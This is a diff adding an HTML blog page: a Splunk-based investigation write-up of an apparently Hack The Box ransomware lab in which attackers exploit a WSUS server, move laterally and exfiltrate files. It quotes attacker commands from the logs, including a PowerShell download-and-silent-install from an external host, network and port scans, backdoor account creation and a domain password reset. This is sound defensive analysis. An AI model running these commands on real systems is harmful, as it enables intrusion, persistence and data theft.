@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>RainingDinosaurs Write-up | Joan Dimas</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <style>
+    .question-box {
+      margin: 1rem 0 1.5rem;
+      padding: 1rem 1.25rem;
+      background: rgba(245, 194, 107, 0.08);
+      border-left: 4px solid var(--accent);
+      border-radius: 12px;
+    }
+    .question-box p { color: #ffffff; margin: 0; }
+    .answer-block { padding: 0.25rem 0 0.5rem; }
+    .task { margin-bottom: 3rem; }
+    .task h3 { color: var(--accent); }
+    .argus-content ol { padding-left: 1.2rem; margin-bottom: 1.5rem; }
+    .image-block figcaption { margin-top: 0.75rem; color: #aaa; font-size: 0.85rem; }
+  </style>
+</head>
+<body class="project-page">
+<div class="argus-page">
+  <header class="argus-header">
+    <h1>RainingDinosaurs Write-up</h1>
+    <a class="back-link" href="../index.html">← Back to HTB Writeups</a>
+  </header>
+  <main class="argus-content">
+    <h2>Scenario:</h2>
+<p>On November 17, 2025, network monitoring detected unusual outbound traffic from a DMZ server (10.10.3.0/24) followed by signs of lateral movement toward the internal network (10.10.11.0/24). We suspect all of this started as an active exploit of CVE-2025-59287, a critical unauthenticated remote code execution vulnerability in Microsoft Windows Server Update Services. Hours later, ransomware began encrypting files across multiple endpoints. Investigators recovered a suspicious executable and collected logs from affected systems. Using Splunk and malware analysis techniques, piece together the full attack chain—from initial compromise to final impact.</p>
+
+    <hr class="section-divider">
+
+    <h2>Executive Summary:</h2>
+<p>This investigation traces a full ransomware intrusion that began with exploitation of a vulnerable Microsoft Windows Server Update Services server. The attacker obtained <strong>NT AUTHORITY\SYSTEM</strong> execution, installed Velociraptor as a command-and-control beacon, performed domain and network reconnaissance, established RDP persistence through a local backdoor account, and abused the trusted WSUS service to repeatedly retrieve and execute payloads.</p>
+
+<p>The intrusion then progressed from the DMZ into the internal network and domain controller. The attacker changed a domain user’s password, pivoted to an internal workstation, exfiltrated <strong>262 files</strong> over unencrypted HTTP, and deployed ransomware associated with LockBit behavior. The ransomware appended the <code>.xlockxlock</code> extension to encrypted files, although some encryption attempts failed because of access restrictions.</p>
+
+    <hr class="section-divider">
+
+    <!-- Q1 -->
+    <div class="task">
+      <h3>Q1:</h3>
+      <div class="question-box">
+        <p>Upon gaining initial access on WSUS-SERVER-01, what user account context were the attacker's commands executed under?</p>
+      </div>
+      <div class="answer-block">
+<p>To begin the investigation, I searched for <strong>Sysmon Process Creation (Event ID 1)</strong> events on <strong><code>WSUS-SERVER-01</code></strong> to identify the first commands executed by the attacker.</p>
+<p>The following Splunk query was used:</p>
+<pre><code>index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational host=&quot;WSUS-SERVER-01&quot; EventCode=1 Image!=*fire* Image!=*packet* Image!=*beat* CommandLine!=*splunk*
+| table _time user host ParentImage Image CommandLine 
+| sort _time
+</code></pre>
+<p>This query returns all process creation events while filtering out known security tooling (such as Packetbeat and the Splunk Universal Forwarder) to reduce noise. I then reviewed the command-line arguments to identify the earliest suspicious activity.</p>
+<p>At <strong><code>2025-11-17 20:35:32</code></strong>, I observed the attacker executing the <strong><code>whoami</code></strong> command:</p>
+<figure class="image-block">
+  <img src="../assets/images/rainingdinosaurs/1.png" alt="Sysmon process creation event showing the attacker executing whoami as NT AUTHORITY\SYSTEM">
+  <figcaption>Sysmon process creation event showing the attacker executing whoami as NT AUTHORITY\SYSTEM</figcaption>
+</figure>
+
+<p>The <code>whoami</code> command is commonly one of the first commands executed after an attacker gains access to a system, as it quickly identifies the security context and privileges of the current session.</p>
+<p>The process was executed under the following account:</p>
+<pre><code>NT AUTHORITY\SYSTEM
+</code></pre>
+      </div>
+    </div>
+    <!-- Q2 -->
+    <div class="task">
+      <h3>Q2:</h3>
+      <div class="question-box">
+        <p>The attacker succeeded in installing a tool to function as a C2 beacon. What is the name of the tool they repurposed for C2?</p>
+      </div>
+      <div class="answer-block">
+<p>While reviewing the process creation events on <strong>WSUS-SERVER-01</strong>, I observed the attacker downloading an MSI installer from an external IP address using the following PowerShell command:</p>
+<pre><code>powershell  (New-Object Net.WebClient).DownloadFile('http://x.x.x.x:7000/v2.msi', 'C:\Users\Public\v2.msi') ; Start-Process msiexec -ArgumentList '/i C:\Users\Public\v2.msi /qn /norestart' -Wait
+</code></pre>
+<p>One occurrence of this command was logged at:</p>
+<pre><code>2025-11-17 20:31:47
+</code></pre>
+<p>This command performs two actions:</p>
+<ol>
+<li>Downloads <code>v2.msi</code> to <code>C:\Users\Public\</code></li>
+<li>Launches <strong><code>msiexec.exe</code></strong> to silently install the package (<code>/qn</code> = quiet mode, <code>/norestart</code> = do not reboot).</li>
+</ol>
+<p>At this point, the important realization is that <strong><code>msiexec.exe</code> is the Windows Installer service responsible for installing MSI packages</strong>. It extracts the application's files, creates directories, registers services, writes registry entries, and performs any installation actions defined by the MSI package.</p>
+<p>Since the attacker installed the malicious tool through an MSI, <strong>any files created during the installation would be attributed to <code>msiexec.exe</code></strong>. Therefore, the next step was to look for file creation events where <code>msiexec.exe</code> was the creating process.</p>
+<pre><code>index=* host=&quot;WSUS-SERVER-01&quot; EventCode=11 Image=*msiexec*
+| table _time Image TargetFilename User
+| sort 0 _time
+</code></pre>
+<p>This returned the following file creation event:</p>
+<pre><code>2025-11-17 20:31:55
+C:\Windows\system32\msiexec.exe 
+C:\Program Files\Velociraptor\Velociraptor.exe
+NT AUTHORITY\SYSTEM
+</code></pre>
+<figure class="image-block">
+  <img src="../assets/images/rainingdinosaurs/2.png" alt="Sysmon file creation event showing msiexec.exe installing Velociraptor">
+  <figcaption>Sysmon file creation event showing msiexec.exe installing Velociraptor</figcaption>
+</figure>
+
+<p>This event confirms that the MSI installer created <strong><code>Velociraptor.exe</code></strong> within <strong><code>C:\Program Files\Velociraptor</code></strong>, identifying <strong>Velociraptor</strong> as the application installed by the attacker.</p>
+      </div>
+    </div>
+    <!-- Q3 -->
+    <div class="task">
+      <h3>Q3:</h3>
+      <div class="question-box">
+        <p>After checking their access level, the attacker executed another command to determine if WSUS-SERVER-01 was part of a domain. What is the full command that was executed?</p>
+      </div>
+      <div class="answer-block">
+<p>Continuing the investigation, I followed the sequence of events after the attacker verified their privileges using the <code>whoami</code> command.</p>
+<p>At <strong><code>2025-11-17 20:37:00</code></strong>, I observed <strong><code>Velociraptor.exe</code></strong> spawning a <strong>PowerShell</strong> process that contained a Base64-encoded command.</p>
+<pre><code>2025-11-17 20:37:00
+User: SYSTEM
+Host: WSUS-SERVER-01
+
+Parent Process:
+C:\Program Files\Velociraptor\Velociraptor.exe
+
+Process:
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+
+Command Line:
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Unrestricted -EncodedCommand RwBlAHQALQBDAG8AbQBwAHUAdABlAHIASQBuAGYAbwAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAARABvAG0AYQBpAG4ALAAgAEQAbwBtAGEAaQBuAE4AYQBtAGUALAAgAFcAbwByAGsAZwByAG8AdQBwAA==
+</code></pre>
+<p>The encoded command was decoded, revealing the following PowerShell command:</p>
+<pre><code>Get-ComputerInfo | Select-Object Domain, DomainName, Workgroup
+</code></pre>
+<figure class="image-block">
+  <img src="../assets/images/rainingdinosaurs/3.png" alt="Decoded PowerShell command used to identify the system domain membership">
+  <figcaption>Decoded PowerShell command used to identify the system domain membership</figcaption>
+</figure>
+
+<p>This command queries the system's configuration and returns information about its domain membership, including:</p>
+<ul>
+<li><strong>Domain</strong> – Indicates whether the system is joined to an Active Directory domain.</li>
+<li><strong>DomainName</strong> – Displays the name of the joined domain.</li>
+<li><strong>Workgroup</strong> – Displays the configured workgroup if the system is not domain-joined.</li>
+</ul>
+<p>Determining whether a compromised host is joined to a domain is a common post-compromise reconnaissance step, as it helps an attacker understand the environment and identify opportunities for privilege escalation and lateral movement.</p>
+      </div>
+    </div>
+    <!-- Q4 -->
+    <div class="task">
+      <h3>Q4:</h3>
+      <div class="question-box">
+        <p>The attacker performed a network scan to identify live hosts. The scan targeted two specific /24 subnets. Provide the two network IDs that were scanned, separated by a comma.</p>
+      </div>
+      <div class="answer-block">
+<p>While reviewing the process creation activity, I identified multiple Base64-encoded commands. Decoding one of the commands executed at <strong><code>2025-11-17 20:43:31</code></strong> revealed the following PowerShell script:</p>
+<pre><code>10..11 | ForEach-Object { $S=$_; $Total=254; 1..$Total | ForEach-Object { $I=$_; $IP=&quot;10.10.$S.&quot;+$I; Write-Progress -Activity &quot;Scanning Network&quot; -Status &quot;Checking IP $IP in Subnet 10.10.$S.x&quot; -PercentComplete (($I/$Total)*100); if (Test-Connection -ComputerName $IP -Count 1 -Quiet -ErrorAction SilentlyContinue) { Write-Host &quot;HOST FOUND: $IP&quot; -ForegroundColor Green } } }  &gt;&gt; 'C:\Users\Public\report02.txt'
+</code></pre>
+<p>The script begins by looping through the values:</p>
+<pre><code>10..11
+</code></pre>
+<p>These values are substituted into the third octet of the IP address, causing the script to scan the following address ranges:</p>
+<pre><code>10.10.10.1 – 10.10.10.254
+10.10.11.1 – 10.10.11.254
+</code></pre>
+<p>For each IP address, the script executes:</p>
+<pre><code>Test-Connection -ComputerName $IP -Count 1 -Quiet
+</code></pre>
+<p><code>Test-Connection</code> sends a single ICMP echo request (ping) to determine whether the host is reachable. If a response is received, the script prints:</p>
+<pre><code>HOST FOUND: &lt;IP&gt;
+</code></pre>
+<p>Finally, the output is appended to:</p>
+<pre><code>C:\Users\Public\report02.txt
+</code></pre>
+<p>using the append redirection operator (<code>&gt;&gt;</code>), allowing the attacker to maintain a list of all responsive hosts discovered during the scan.</p>
+<figure class="image-block">
+  <img src="../assets/images/rainingdinosaurs/4.png" alt="Decoded PowerShell network discovery script scanning the 10.10.10.0/24 and 10.10.11.0/24 networks">
+  <figcaption>Decoded PowerShell network discovery script scanning the 10.10.10.0/24 and 10.10.11.0/24 networks</figcaption>
+</figure>
+
+<p>From the script, it is clear that the attacker scanned the following two <code>/24</code> networks:</p>
+<pre><code>10.10.10.0/24, 10.10.11.0/24
+</code></pre>
+      </div>
+    </div>
+    <!-- Q5 -->
+    <div class="task">
+      <h3>Q5:</h3>
+      <div class="question-box">
+        <p>The attacker's network scanning script looked for specific open ports to identify valid targets. Besides ports 88, 389, 445, and 3389, what other port number was the attacker scanning for?</p>
+      </div>
+      <div class="answer-block">
+<p>For this question, I followed a similar approach by reviewing the process creation events for suspicious PowerShell activity. I identified an interesting event at <strong><code>2025-11-17 21:57:58</code></strong>, which contained the following PowerShell script:</p>
+<pre><code>$Targets=@('10.10.11.37','10.10.11.61','10.10.11.146');$Ports=@(8530,3389,445,389,88);$Jobs=@();$Targets|ForEach-Object{$IP=$_;$Ports|ForEach-Object{$Port=$_;$Jobs+=Start-Job -ScriptBlock {param($IP,$Port)try{$Socket=New-Object System.Net.Sockets.TcpClient;$Connect=$Socket.BeginConnect($IP,$Port,$null,$null);$Wait=$Connect.AsyncWaitHandle.WaitOne(500,$false);if($Wait-and$Socket.Connected){Write-Host &quot;${IP}:${Port} - Open&quot; -ForegroundColor Cyan}}catch{}finally{if($Socket-ne$null){$Socket.Close()}}} -ArgumentList $IP,$Port}};$Jobs|Wait-Job|Receive-Job
+</code></pre>
+<figure class="image-block">
+  <img src="../assets/images/rainingdinosaurs/5.png" alt="PowerShell TCP port scan including WSUS port 8530">
+  <figcaption>PowerShell TCP port scan including WSUS port 8530</figcaption>
+</figure>
+
+<p>The script defines a list of target systems and a collection of TCP ports to test for connectivity:</p>
+<pre><code>$Ports=@(8530,3389,445,389,88)
+</code></pre>
+<p>It then iterates through each target and attempts to establish a TCP connection to every port using the .NET <strong><code>System.Net.Sockets.TcpClient</code></strong> class. If a connection is successful, the script reports the port as open.</p>
+<p>Since the question already provided ports <strong>88</strong>, <strong>389</strong>, <strong>445</strong>, and <strong>3389</strong>, the remaining port being scanned was:</p>
+<pre><code>8530
+</code></pre>
+<p>Port <strong>8530</strong> is the default HTTP port used by <strong>Windows Server Update Services (WSUS)</strong>. Given that the attacker had already compromised a WSUS server, scanning for additional hosts with port <strong>8530</strong> open would allow them to identify other WSUS servers within the environment that could be targeted for further compromise or lateral movement.</p>
+      </div>
+    </div>
+    <!-- Q6 -->
+    <div class="task">
+      <h3>Q6:</h3>
+      <div class="question-box">
+        <p>Unable to directly RDP into the private network, the attacker created a local account on the DMZ server for remote access. What is the name of this account?</p>
+      </div>
+      <div class="answer-block">
+<p>For this question, I once again reviewed the process creation events and identified a Base64-encoded PowerShell command. After decoding it, the following script was revealed:</p>
+<pre><code>New-LocalUser -Name &quot;guestuser&quot; -Password (ConvertTo-SecureString &quot;P@sswOrd456&quot; -AsPlainText -Force) -AccountExpires (Get-Date).AddDays(7); Add-LocalGroupMember -Group &quot;Remote Desktop Users&quot; -Member &quot;guestuser&quot;
+</code></pre>
+<p>From the decoded command, it is clear that the attacker created a new local user account named <strong><code>guestuser</code></strong> with a temporary password and configured the account to expire after seven days.</p>
+<p>Immediately afterward, the attacker executed:</p>
+<pre><code>Add-LocalGroupMember -Group &quot;Remote Desktop Users&quot; -Member &quot;guestuser&quot;
+</code></pre>
+<p>This command added the newly created account to the <strong>Remote Desktop Users</strong> local group, granting it permission to authenticate via <strong>Remote Desktop Protocol</strong>.</p>
+      </div>
+    </div>
+    <!-- Q7 -->
+    <div class="task">
+      <h3>Q7:</h3>
+      <div class="question-box">
+        <p>After creating the backdoor account, the attacker connected to WSUS-SERVER-01 via RDP. What was the source IP address of this connection?</p>
+      </div>
+      <div class="answer-block">
+<p>To answer this question, I searched for successful <strong>Remote Desktop (RDP)</strong> logon events on <strong><code>WSUS-SERVER-01</code></strong>. In Windows Security logs, <strong>Event ID 4624</strong> represents a successful logon, and <strong>Logon Type 10</strong> specifically indicates an interactive Remote Desktop (RemoteInteractive) session.</p>
+<p>The following Splunk query was used:</p>
+<pre><code>index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational host=&quot;WSUS-SERVER-01&quot; EventCode=4624 Logon_Type=10
+| table _time host src user
+| sort _time
+</code></pre>
+<p>This returned the following events:</p>
+<table class="ioc-table">
+<thead>
+<tr>
+  <th>Time</th>
+  <th>Host</th>
+  <th>Source IP</th>
+  <th>User</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>2025-11-17 22:44:36</td>
+  <td>WSUS-SERVER-01</td>
+  <td>3.120.140.221</td>
+  <td>guestuser</td>
+</tr>
+<tr>
+  <td>2025-11-18 00:17:15</td>
+  <td>WSUS-SERVER-01</td>
+  <td>3.120.140.221</td>
+  <td>guestuser</td>
+</tr>
+</tbody>
+</table>
+<p>These events confirm that the newly created <strong><code>guestuser</code></strong> account was used to establish two successful RDP sessions to <strong>WSUS-SERVER-01</strong>.</p>
+<p>Therefore, the source IP address of the attacker's RDP connection was:</p>
+<pre><code>3.120.140.221
+</code></pre>
+<p>This also correlates with the previous question, where the attacker created the <strong><code>guestuser</code></strong> account and added it to the <strong>Remote Desktop Users</strong> group, indicating the account was specifically created to facilitate remote interactive access via RDP.</p>
+<figure class="image-block">
+  <img src="../assets/images/rainingdinosaurs/6.png" alt="Successful RDP logon events from the attacker-controlled source IP">
+  <figcaption>Successful RDP logon events from the attacker-controlled source IP</figcaption>
+</figure>
+      </div>
+    </div>
+    <!-- Q8 -->
+    <div class="task">
+      <h3>Q8:</h3>
+      <div class="question-box">
+        <p>The attacker configured a legitimate service to repeatedly download and execute their payload, ensuring persistence. At what interval (in seconds) was the service configured to download and execute the payload?</p>
+      </div>
+      <div class="answer-block">
+<p>For this question, I revisited the events surrounding the download of the <code>v2.msi</code> payload, as I had noticed earlier that the download command appeared multiple times. Upon further investigation, I found that the process responsible for executing the download was:</p>
+<pre><code>C:\Program Files\Update Services\Services\WsusService.exe
+</code></pre>
+<p>running under the <strong><code>NETWORK SERVICE</code></strong> account. Since <strong><code>WsusService.exe</code></strong> is a legitimate Windows Server Update Services (WSUS) service, seeing it spawn a command to download an MSI from an external IP address was a strong indicator that the service had been repurposed for persistence.</p>
+<figure class="image-block">
+  <img src="../assets/images/rainingdinosaurs/7.png" alt="WSUS service repeatedly downloading and executing the attacker payload">
+  <figcaption>WSUS service repeatedly downloading and executing the attacker payload</figcaption>
+</figure>
+
+<p>Reviewing the process creation events showed the download command executing multiple times. The first occurrence was observed at:</p>
+<pre><code>2025-11-17 20:37:17
+</code></pre>
+<p>and the next occurrence at:</p>
+<pre><code>2025-11-17 20:47:18
+</code></pre>
+<p>The elapsed time between the two executions is <strong>10 minutes and 1 second (601 seconds)</strong>. However, the expected answer was <strong>600 seconds</strong>, indicating the additional second is simply due to logging granularity and event timestamps rather than the actual configured interval.</p>
+<p>Therefore, the service was configured to download and execute the payload every:</p>
+<pre><code>600 seconds (10 minutes)
+</code></pre>
+<p>One additional observation worth noting is that the attacker chose to abuse an <strong>existing, trusted Windows service</strong> rather than creating a new one. This is a common persistence technique because legitimate services are less likely to attract attention than a newly installed service.</p>
+      </div>
+    </div>
+    <!-- Q9 -->
+    <div class="task">
+      <h3>Q9:</h3>
+      <div class="question-box">
+        <p>The attacker downloaded and used a custom tool on WSUS-SERVER-01 to move laterally to the domain controller. What was the argument passed to this executable to successfully carry its action?</p>
+      </div>
+      <div class="answer-block">
+<p>For this question, I continued reviewing the process creation events and identified an interesting execution of <strong><code>ping.exe</code></strong>, a custom tool that had been downloaded to the compromised host earlier in the attack.</p>
+<p>The following process creation event was observed:</p>
+<table class="ioc-table">
+<thead>
+<tr>
+  <th>Time</th>
+  <th>User</th>
+  <th>Host</th>
+  <th>Process</th>
+  <th>Command Line</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>2025-11-17 22:06:28</td>
+  <td>SYSTEM</td>
+  <td>WSUS-SERVER-01</td>
+  <td><code>C:\Users\Public\ping.exe</code></td>
+  <td><code>&quot;C:\Users\Public\ping.exe&quot; http://10.10.11.61:8530</code></td>
+</tr>
+</tbody>
+</table>
+<p>From the command line, it is clear that the attacker executed the tool and supplied the following argument:</p>
+<pre><code>http://10.10.11.61:8530
+</code></pre>
+<p>Although the executable is named <strong><code>ping.exe</code></strong>, it is not the legitimate Windows <code>ping.exe</code> located in <code>C:\Windows\System32</code>. Instead, this is a custom attacker-supplied executable located in <strong><code>C:\Users\Public</code></strong>, indicating it was likely renamed to blend in with legitimate system utilities.</p>
+<p>Based on the lab context, this tool was used by the attacker as part of the lateral movement from <strong>WSUS-SERVER-01</strong> toward the domain controller. The question specifically asks for the argument passed to the executable, which is:</p>
+<pre><code>http://10.10.11.61:8530
+</code></pre>
+<p>This also reinforces the importance of validating an executable's <strong>path</strong>, not just its filename. A process named <code>ping.exe</code> may appear benign at first glance, but its location outside the standard Windows directories and its command-line arguments clearly indicate malicious activity.</p>
+      </div>
+    </div>
+    <!-- Q10 -->
+    <div class="task">
+      <h3>Q10:</h3>
+      <div class="question-box">
+        <p>What was the timestamp when the first command was executed on the Domain Controller (DC01) by the attacker after lateral movement?</p>
+      </div>
+      <div class="answer-block">
+<p>To answer this question, I pivoted to <strong><code>DC01</code></strong> and reviewed the process creation events (Sysmon Event ID 1) to identify the first command executed after the attacker laterally moved to the domain controller. To reduce noise from legitimate monitoring software, I filtered out known security tooling such as Packetbeat and the Splunk Universal Forwarder.</p>
+<p>The following Splunk query was used:</p>
+<pre><code>index=* host=&quot;DC01&quot; source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1 Image!=*fire* Image!=*packet* Image!=*beat* CommandLine!=*splunk*
+| table _time user host ParentImage Image CommandLine
+| sort _time
+</code></pre>
+<p>Reviewing the resulting events, the earliest attacker command observed was <strong><code>whoami</code></strong>, which was executed at:</p>
+<pre><code>2025-11-17 22:29:08
+</code></pre>
+<p>Although <strong><code>whoami</code></strong> is a simple command, it is commonly one of the first commands an attacker executes after obtaining access to a system. It allows them to verify the security context of their session and determine the privileges available before performing additional actions.</p>
+<p>Therefore, the timestamp of the first command executed on <strong>DC01</strong> after lateral movement was:</p>
+<pre><code>2025-11-17 22:29:08
+</code></pre>
+      </div>
+    </div>
+    <!-- Q11 -->
+    <div class="task">
+      <h3>Q11:</h3>
+      <div class="question-box">
+        <p>The attacker used a native Windows command-line utility to change a domain user's password. What is the timestamp for this modification?</p>
+      </div>
+      <div class="answer-block">
+<p>To answer this question, I continued reviewing the process creation events on <strong>DC01</strong> and identified the execution of the native Windows utility <strong><code>net.exe</code></strong>. This utility can be used to administer both local and domain user accounts, including changing passwords.</p>
+<p>The following process creation events were observed:</p>
+<table class="ioc-table">
+<thead>
+<tr>
+  <th>Time</th>
+  <th>User</th>
+  <th>Parent Process</th>
+  <th>Process</th>
+  <th>Command Line</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>2025-11-17 22:35:48</td>
+  <td>SYSTEM</td>
+  <td><code>powershell.exe</code></td>
+  <td><code>net.exe</code></td>
+  <td><code>&quot;C:\Windows\system32\net.exe&quot; user dwalker Sph!nky_00 /domain</code></td>
+</tr>
+<tr>
+  <td>2025-11-17 22:35:48</td>
+  <td>SYSTEM</td>
+  <td><code>net.exe</code></td>
+  <td><code>net1.exe</code></td>
+  <td><code>C:\Windows\system32\net1 user dwalker Sph!nky_00 /domain</code></td>
+</tr>
+<tr>
+  <td>2025-11-17 22:35:49</td>
+  <td>SYSTEM</td>
+  <td><code>powershell.exe</code></td>
+  <td><code>net.exe</code></td>
+  <td><code>&quot;C:\Windows\system32\net.exe&quot; user dwalker Sph!nky_00 /domain</code></td>
+</tr>
+<tr>
+  <td>2025-11-17 22:35:49</td>
+  <td>SYSTEM</td>
+  <td><code>net.exe</code></td>
+  <td><code>net1.exe</code></td>
+  <td><code>C:\Windows\system32\net1 user dwalker Sph!nky_00 /domain</code></td>
+</tr>
+</tbody>
+</table>
+<figure class="image-block">
+  <img src="../assets/images/rainingdinosaurs/8.png" alt="Domain password modification performed with net.exe">
+  <figcaption>Domain password modification performed with net.exe</figcaption>
+</figure>
+
+<p>The command executed was:</p>
+<pre><code>net user dwalker Sph!nky_00 /domain
+</code></pre>
+<p>This command changes the password of the Active Directory user <strong><code>dwalker</code></strong> to <strong><code>Sph!nky_00</code></strong>. The <code>/domain</code> switch instructs <code>net.exe</code> to perform the operation against the domain controller rather than the local system.</p>
+<p>Although both <strong><code>net.exe</code></strong> and <strong><code>net1.exe</code></strong> appear in the logs, this is expected behavior. On modern Windows systems, <code>net.exe</code> internally invokes <strong><code>net1.exe</code></strong> to perform the requested operation, which is why both processes are recorded.</p>
+<p>Therefore, the timestamp when the domain user's password was modified was:</p>
+<pre><code>2025-11-17 22:35:48
+</code></pre>
+      </div>
+    </div>
+    <!-- Q12 -->
+    <div class="task">
+      <h3>Q12:</h3>
+      <div class="question-box">
+        <p>Using the compromised domain account identified earlier, the attacker pivoted from the DMZ to the internal network. What is the timestamp of the first successful logon to WKSTN-01?</p>
+      </div>
+      <div class="answer-block">
+<p>To answer this question, I searched for successful logon events on <strong><code>WKSTN-01</code></strong> using Windows Security <strong>Event ID 4624</strong>, which records successful account logons.</p>
+<p>The following Splunk query was used:</p>
+<pre><code>index=* host=&quot;WKSTN-01&quot; EventCode=4624
+| table _time host user src Logon_Type
+| sort 0 _time
+</code></pre>
+<p>Reviewing the results, I identified the first successful logon involving the previously compromised domain account at:</p>
+<pre><code>2025-11-17 22:52
+</code></pre>
+<figure class="image-block">
+  <img src="../assets/images/rainingdinosaurs/9.png" alt="Successful attacker logon to WKSTN-01 using the compromised domain account">
+  <figcaption>Successful attacker logon to WKSTN-01 using the compromised domain account</figcaption>
+</figure>
+
+<p>We got a successful logon into the <code>WKSTN-01</code> host on: <code>2025-11-17 22:52</code> indicating that the attacker successfully pivoted inside the network.</p>
+<p>This event confirms that the attacker successfully authenticated to <strong><code>WKSTN-01</code></strong> using the compromised domain account, completing the pivot from the DMZ environment into the internal network.</p>
+      </div>
+    </div>
+    <!-- Q13 -->
+    <div class="task">
+      <h3>Q13:</h3>
+      <div class="question-box">
+        <p>Analyze the network logs (index=&quot;suricata&quot;) for connections from DC01. How many files were successfully uploaded to the attacker's exfiltration server?</p>
+      </div>
+      <div class="answer-block">
+<p>While reviewing process activity on <strong>DC01</strong>, I identified a Base64-encoded command that, once decoded, revealed the attacker-controlled exfiltration server:</p>
+<pre><code>18[.]193[.]76[.]209:4000
+</code></pre>
+<figure class="image-block">
+  <img src="../assets/images/rainingdinosaurs/10.png" alt="Decoded PowerShell command revealing the attacker exfiltration server">
+  <figcaption>Decoded PowerShell command revealing the attacker exfiltration server</figcaption>
+</figure>
+
+<p>Using this information, I pivoted to the Suricata network logs and searched for HTTP <code>PUT</code> requests to the identified server:</p>
+<pre><code>index=&quot;suricata&quot; dest_ip=18.193.76.209 dest_port=4000 http.http_method=put 
+|  dedup http.url
+</code></pre>
+<p>The search filters for traffic sent to the attacker-controlled IP address over port <code>4000</code>. The HTTP <code>PUT</code> method is significant because it is commonly used to upload data to a remote web server.</p>
+<p>I then deduplicated the results by <code>http.url</code>, as each unique URL represented a separate file-upload destination. This prevented retransmissions or duplicate network events for the same file from being counted multiple times.</p>
+<p>The search returned:</p>
+<pre><code>262
+</code></pre>
+<figure class="image-block">
+  <img src="../assets/images/rainingdinosaurs/11.png" alt="Suricata HTTP PUT events showing successful file uploads to the exfiltration server">
+  <figcaption>Suricata HTTP PUT events showing successful file uploads to the exfiltration server</figcaption>
+</figure>
+
+<p>Therefore, the attacker successfully uploaded:</p>
+<pre><code>262 files
+</code></pre>
+      </div>
+    </div>
+    <!-- Q14 -->
+    <div class="task">
+      <h3>Q14:</h3>
+      <div class="question-box">
+        <p>What is the MITRE ATT&amp;CK technique ID that best describes the exfiltration method used by the attacker?</p>
+      </div>
+      <div class="answer-block">
+<p>The technique for this is:</p>
+<pre><code>T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol
+</code></pre>
+<p>The reason being the attacker uploaded files directly to an external server (<code>18.193.76.209:4000</code>), Used <strong>HTTP PUT</strong> requests, sent the data over an <strong>unencrypted HTTP connection</strong> rather than HTTPS, and used a dedicated exfiltration server rather than embedding the data within an existing command-and-control channel.</p>
+      </div>
+    </div>
+    <!-- Q15 -->
+    <div class="task">
+      <h3>Q15:</h3>
+      <div class="question-box">
+        <p>In the final stage of the attack, a ransomware payload was deployed across the compromised machines. What file extension was the ransomware designed to append to encrypted files?</p>
+      </div>
+      <div class="answer-block">
+<p>I actually identified this earlier while analyzing the Base64-encoded PowerShell commands executed on the initial compromised host.</p>
+<p>One particularly interesting event occurred at <strong><code>2025-11-18 00:36:10</code></strong>, where the decoded script exhibited clear ransomware behavior.</p>
+<figure class="image-block">
+  <img src="../assets/images/rainingdinosaurs/12.png" alt="Decoded ransomware PowerShell script appending the .xlockxlock extension">
+  <figcaption>Decoded ransomware PowerShell script appending the .xlockxlock extension</figcaption>
+</figure>
+
+<p>Within the script, the following command was observed:</p>
+<pre><code>ren $ifi -NewName $ifi&quot;.xlockxlock&quot;
+</code></pre>
+<p>This command renames each encrypted file by appending the <strong><code>.xlockxlock</code></strong> extension to its original filename. For example:</p>
+<pre><code>report.docx  →  report.docx.xlockxlock
+</code></pre>
+<p>Appending a unique extension to encrypted files is a common ransomware technique, allowing the malware to easily identify which files have already been encrypted while also signaling to the victim that the files are no longer accessible.</p>
+      </div>
+    </div>
+    <!-- Q16 -->
+    <div class="task">
+      <h3>Q16:</h3>
+      <div class="question-box">
+        <p>The file extension and techniques observed are associated with a known ransomware group. What is the name of this group?</p>
+      </div>
+      <div class="answer-block">
+<p>A quick google search of the extension revealed the group to be:</p>
+<pre><code>lockbit
+</code></pre>
+      </div>
+    </div>
+    <!-- Q17 -->
+    <div class="task">
+      <h3>Q17:</h3>
+      <div class="question-box">
+        <p>The attacker deployed ransomware across compromised systems, but the encryption was not entirely successful. What is the name of the first file that the ransomware failed to encrypt on WKSTN-01?</p>
+      </div>
+      <div class="answer-block">
+<p>For this final question, I first noted the timestamp when the ransomware PowerShell script was executed (<code>2025-11-18 00:36:10</code>). Since the question specifically stated that the encryption was <strong>not entirely successful</strong>, I pivoted to <strong>PowerShell Event ID 4100</strong>, which records PowerShell runtime errors.</p>
+<p>Reviewing the events around the ransomware execution timeframe, I identified the earliest error generated by the ransomware process. The event indicated an <strong>&quot;Access to the path is denied&quot;</strong> error while attempting to encrypt the file:</p>
+<pre><code>auxbase.xml
+</code></pre>
+<p>This revealed that the ransomware was unable to encrypt the file due to insufficient access permissions, making it the <strong>first file</strong> that the ransomware failed to encrypt.</p>
+<p>Therefore, the answer is:</p>
+<pre><code>auxbase.xml
+</code></pre>
+      </div>
+    </div>
+
+    <hr class="section-divider">
+
+    <div class="task">
+      <h3>Indicators of Compromise (IOC)</h3>
+      <table class="ioc-table">
+        <thead>
+          <tr><th>IOC Type</th><th>Indicator</th><th>Description</th></tr>
+        </thead>
+        <tbody>
+        <tr><td>Vulnerability</td><td><code>CVE-2025-59287</code></td><td>Suspected initial-access vulnerability affecting Microsoft WSUS</td></tr>
+        <tr><td>Compromised Host</td><td><code>WSUS-SERVER-01</code></td><td>Initial server compromised in the DMZ</td></tr>
+        <tr><td>Execution Context</td><td><code>NT AUTHORITY\SYSTEM</code></td><td>Security context used for the attacker’s initial commands</td></tr>
+        <tr><td>C2 Tool</td><td><code>Velociraptor</code></td><td>Legitimate DFIR tool repurposed as a command-and-control beacon</td></tr>
+        <tr><td>Malicious Installer</td><td><code>C:\Users\Public\v2.msi</code></td><td>MSI package downloaded and silently installed by the attacker</td></tr>
